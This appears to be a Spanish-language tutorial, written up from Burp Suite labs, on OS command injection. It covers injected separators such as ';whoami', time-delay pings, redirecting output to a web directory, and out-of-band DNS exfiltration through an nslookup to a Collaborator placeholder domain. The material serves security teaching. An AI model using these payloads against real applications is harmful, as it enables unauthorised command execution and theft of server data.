@@ -1,0 +1,318 @@
+<h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Introducción.</li>
+  <li>2 Concepto de OS Command.</li>
+  <li>3 Inyección de comandos.
+    <ul>
+      <li>3.1. Explotando una vulnerabilidad de inyección de comandos</li>
+      <li>3.2. Comandos útiles</li>
+    </ul>
+  </li>
+  <li>4 Inyección de comandos ciega
+    <ul>
+      <li>4.1. Concepto de vulnerabilidad de inyección de comandos ciega</li>
+      <li>4.2. Técnicas de detección y explotación de vulnerabilidades ciega
+        <ul>
+          <li>4.2.1. Detectando OS command injection utilizando time delays</li>
+          <li>4.2.2. Explotando una OS Command Injection redirijiendo output</li>
+          <li>4.2.3. Explotando una vulnerabilidad OS comand injection utilizando OAST</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>5 Términos concatenadores de comandos</p>
+
+    <p><br /></p>
+  </li>
+</ul>
+
+<h3 id="1-introducción">1. Introducción</h3>
+<p>En esta sección explicaremos qué es el OS command injection (Operating System Command Injection), describiremos cómo detectar vulnerabilidades, cómo explotarlas. Especificaremos diferentes comandos útiles para distintos sistemas operativos.</p>
+
+<p><br /></p>
+
+<h3 id="2-concepto-de-os-command-injection">2. Concepto de OS Command Injection.</h3>
+
+<p>OS Command Injection, también conocido como Shell Injection, es una vulnerabilidad web que permite a un atacante ejecutar comandos arbitrarios en el servidor que está corriendo una aplicación web y que generalmente compromete la propia aplicación y todos sus datos.</p>
+
+<p>Muy a menudo, un atacante puede escalar un OS Command Injection para comprometer otras partes de la infraestructura del host (pivoting).</p>
+
+<p><br /></p>
+
+<h3 id="3-inyección-de-comandos">3. Inyección de comandos.</h3>
+
+<h4 id="31-explotando-una-vulnerabilidad-de-inyección-de-comandos">3.1. Explotando una vulnerabilidad de inyección de comandos.</h4>
+
+<p>Para entender mejor cómo es una vulnerabilidad de inyección de comandos vamos a realizar un ejemplo.</p>
+
+<p>Consideremos una tienda online que permite al usaurio ver si un item se encuentra en stock en una tienda en particular. Esta petición se procesa a través de la siguiente URL:</p>
+
+<pre><code class="language-default">https://insecure-website.com/stockStatus?productID=381&amp;storeID=29
+</code></pre>
+
+<p>A su vez, para poder proveer la información del stock, la aplicación debe realizar una serie de búsquedas a sistemas anticuados (legacy system) que por razones históricas la funcionalidad se implementó llamando a shells de comandos en los que se introducía un comando y unos argumentos para obtener la información requerida:</p>
+
+<pre><code class="language-default">stockreport.pl 381 29
+</code></pre>
+
+<p>Este comando muestra el estado del stock para un item específico, información que se le muestra seguidamente al usuario.</p>
+
+<p>Como la aplicación no implementa defensas frente a un ataque de inyección de comandos un atacante puede introducir el siguiente input en la URL para ejecutar comandos arbitrarios:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp; <span class="nb">echo </span>aiwefwlguh &amp;
+</code></pre></div></div>
+
+<p>De esta forma, la query de búsqueda quedaría:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stockreport.pl &amp; <span class="nb">echo </span>aiwefwlguh &amp; 29
+</code></pre></div></div>
+
+<p>No hay errores de sintaxis y el comando se ejecuta satisfactoriamente.</p>
+
+<p>Esto no es más que una prueba para verificar que efectivamente la aplicación es vulnerable a una inyección de comandos. Si efectivamente lo es la página devolverá el string “aiwefwlguh”.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Error - productID was not found
+aiwefwlguh
+29: <span class="nb">command </span>not found
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: OS command injection, simple case</strong>.</p>
+
+<p>El laboratorio contiene una vulnerabilidad de inyección de comandos en el parámetro que comprueba el stock de un producto. Tal aplicación ejecuta una shell en la que introduce a modo de argumentos el valor de los parámetros de la petición del usuario.</p>
+
+<p>Así, se tiene que vamos a ver los detalles de cualquier producto e interceptamos la petición cuando pulsamos el botón de ‘Check Stock’ situado en la parte inferior de la página:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220405105041.png" text-align="center" />
+</div>
+
+<p>Y cambiamos el valor del parámetro storeid a ‘;whoami’ para concatenar el comando deseado:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220405105122.png" text-align="center" />
+</div>
+
+<p>Obteniendo finalmente:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220405105140.png" text-align="center" />
+</div>
+
+<p>Y hemos resuelto el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="32-comandos-útiles">3.2. Comandos útiles.</h4>
+
+<p>Los comandos a introducir, evidentemente, pueden variar en función del sistema operativo del servidor.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Comando</th>
+      <th>Linux</th>
+      <th>Windows</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Nombre del usuario</td>
+      <td>whoami</td>
+      <td>whoami</td>
+    </tr>
+    <tr>
+      <td>Sistema Operativo</td>
+      <td>uname -a</td>
+      <td>ver</td>
+    </tr>
+    <tr>
+      <td>Configuración de red</td>
+      <td>ifconfig</td>
+      <td>ipconfig/all</td>
+    </tr>
+    <tr>
+      <td>Conexiones de red</td>
+      <td>netstat -an</td>
+      <td>netstat -an</td>
+    </tr>
+    <tr>
+      <td>Procesos en ejecución</td>
+      <td>ps -ef</td>
+      <td>tasklist</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<h3 id="4-inyección-de-comandos-ciega">4. Inyección de comandos ciega.</h3>
+
+<h4 id="41-concepto-de-vulnerabilidad-de-inyección-de-comandos-ciega">4.1. Concepto de vulnerabilidad de inyección de comandos ciega.</h4>
+<p>Una vulnerabilidad de inyección de comandos ciega hace referencia a una inyección de comandos en la que la aplicación no devuelve output.</p>
+
+<p>Esta clase de vulnerabilidades siguen siendo explotables aunque se requieren de técnicas un poco distintas.</p>
+
+<p>Por ejemplo, consideremos un sitio web que permite a un usuario introducir comentarios u opiniones (feedback) sobre el sitio. Los usuarios ponen su email y su mensaje.</p>
+
+<p>A su vez, la aplicación en el lado del servidor genera un email al lado del administrador llamando al programa ‘mail’ por ejemplo de la siguiente manera:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mail <span class="nt">-s</span> <span class="s2">"feedback_message"</span> <span class="nt">-a</span> From:peter@normal-user.net feedback@vulnerable-website.com
+</code></pre></div></div>
+
+<p>De esta manera, el feedback_message no se devuelve al usuario y por tanto la técnica del ‘echo’ ya no resulta efectiva.</p>
+
+<p><br /></p>
+
+<h4 id="42-técnicas-de-detección-y-explotación-de-vulnerabilidades-ciega">4.2. Técnicas de detección y explotación de vulnerabilidades ciega.</h4>
+
+<p><br /></p>
+
+<h5 id="421-detectando-os-command-injection-utilizando-time-delays">4.2.1. Detectando OS command injection utilizando time delays.</h5>
+
+<p>En lugar de utilizar el comando “echo” podemos emplear el comando “ping” junton con el bucle local para que se haga ping a si mismo.</p>
+
+<p>Cada paquete de ping dura un segundo, luego si en el caso anterior un usuario enviará un mensaje con el siguiente contenido: “ &amp; ping -c3 127.0.0.1 &amp; “, esto se traduciría en el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mail <span class="nt">-s</span> <span class="s2">""</span> &amp; ping <span class="nt">-c10</span> 127.0.0.1 &amp; <span class="s2">""</span> <span class="nt">-a</span> From:peter@normal-user.net feedback@vulnerable-website.com
+</code></pre></div></div>
+
+<p>Se tiene que el servidor tardaría 10 segundos en devolver la respuesta http.</p>
+
+<p>Aunque evidentemente el formato a introducir cambiará en función de la forma que tenga el servidor de procesar el mensaje.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: Blind OS command injection with time delays</strong>.</p>
+
+<p>El siguiente laboratorio tiene una OS command injection en algún parámetro de la request que se realiza cuando mandamos un comentario de feedback del sitio web.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220405180238.png" text-align="center" />
+</div>
+
+<p>Interceptando dicha request con el proxy de burp y seguidamente envíandolo hacía el repetidor podemos probar a intercalar el término “; ping -c10 127.0.0.1 &amp;” para concatenar un ping y ver cuándo el servidor tarda 10 segundos en darnos la respuesta:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220405180536.png" text-align="center" />
+</div>
+
+<p>Podemos ver que introduciendo dicho término en el paramtetro ‘email’ finalmente obtenemos un delay de 10 segundos.</p>
+
+<p><br /></p>
+
+<h5 id="422-explotando-una-os-command-injection-redirijiendo-output">4.2.2. Explotando una OS Command Injection redirijiendo output.</h5>
+
+<p>También podemos probar a redirigir el output del comando que inyectamos a una parte del servidor web que puedes ver desde el navegador como ocurre en el caso de <strong>/var/www/static</strong> introduciendo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp; <span class="nb">whoami</span> <span class="o">&gt;</span> /var/www/whoami.txt &amp;
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: Blind OS command injection with output redirection</strong>.</p>
+
+<p>Este laboratorio contiene una OS command injection vulnerability en la función feedback. El objetivo es conseguir ver el output del comando inyectado enviándolo a un directorio con permisos de escritura: /var/www/images/</p>
+
+<p>Luego, hacer una request de la URL a ese directorio para poder tener acceso al output.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Interceptamos la request de feedback, la modificamos adecuadamente introduciendo en el valor del parámetro email:</td>
+      <td> </td>
+      <td>whoami&gt;/var/www/images/output.txt</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y seguidamente intentamos ver una de las fotos y cambiamos el valor del parámetro filename a output.txt:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220405184126.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h5 id="423-explotando-una-vulnerabilidad-os-comand-injection-utilizando-oast">4.2.3. Explotando una vulnerabilidad OS comand injection utilizando OAST.</h5>
+
+<p>También podemos emplear la téncica OAST como lo hemos hecho en el apartado de SQLi para inyectar un payload que entre otras cosas haga una interacción con un sistema que nosotros podamos ver como el client BurpCollaborator.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: Blind OS command injetion with out-of-band interaction</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad de inyección de comandos ciega en la función de feedback. La aplicación ejecuta un comando de shell que contiene los detalles proporcionados por el usuario. El comando se ejecuta de forma asíncrona y no tiene efecto en la respuesta de la aplicación. No es posible redirigir la salida a una ubicación a la que pueda acceder. Sin embargo, puede desencadenar interacciones fuera de banda con un dominio externo</p>
+
+<p>En primer lugar, accedemos al laboratorio en el que sabemos que el parámetro vulnerable a la inyección de comandos es el parámetro email e introducimos el siguiente payload:</p>
+
+<pre><code class="language-default">email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+</code></pre>
+
+<p>De esa forma haremos una búsqueda DNS.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: Blind OS command injection with out-of-band data exfiltration</strong></p>
+
+<p>Esta práctica de laboratorio contiene una vulnerabilidad de inyección de comandos ciegos del sistema operativo en la función de feedback.</p>
+
+<p>La aplicación ejecuta un comando de shell que contiene los detalles proporcionados por el usuario. El comando se ejecuta de forma asíncrona y no tiene efecto en la respuesta de la aplicación. No es posible redirigir la salida a una ubicación a la que pueda acceder. Sin embargo, puede desencadenar interacciones fuera de banda con un dominio externo.</p>
+
+<p>Para resolver el laboratorio, ejecute el comando whoami y extraiga el resultado a través de una consulta de DNS a Burp Collaborator. Deberá ingresar el nombre del usuario actual para completar el laboratorio.</p>
+
+<p>De nuevo, ingresamos en el laboratorio y lo primero que hacemos es cargar el cliente de BurpCollaborator tal y como hicimos en SQLi:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509231115.png" text-align="center" />
+</div>
+
+<p>Y le damos a copy clickboard para copiar el subdominio del servidor:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509231142.png" text-align="center" />
+</div>
+
+<p>Sencillamente accedemos a la funcionalidad feedback, interceptamos la request y copiamos el payload que proporciona la solución del laboratorio.</p>
+
+<p>De vuelta sobre el menu del BurpCollaborator Client veremos el nombre del usuario que ha hecho las búsquedas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509232700.png" text-align="center" />
+</div>
+
+<h3 id="5-términos-concatenadores-de-comandos">5. Términos concatenadores de comandos.</h3>
+
+<p>A variety of shell metacharacters can be used to perform OS command injection attacks.</p>
+
+<p>A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:</p>
+
+<ul>
+  <li>&amp;</li>
+  <li>&amp;&amp;</li>
+  <li>|</li>
+  <li>| |</li>
+</ul>
+
+<p>The following command separators work only on Unix-based systems:</p>
+
+<ul>
+  <li>;</li>
+  <li>Newline (0x0a or \n)</li>
+</ul>
+
+<p>On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:</p>
+
+<ul>
+  <li>injected command</li>
+  <li>$(injected command)</li>
+</ul>
+
+<p>Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.</p>
+
+<p>Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using “ or ‘) before using suitable shell metacharacters to inject a new command.</p>
+
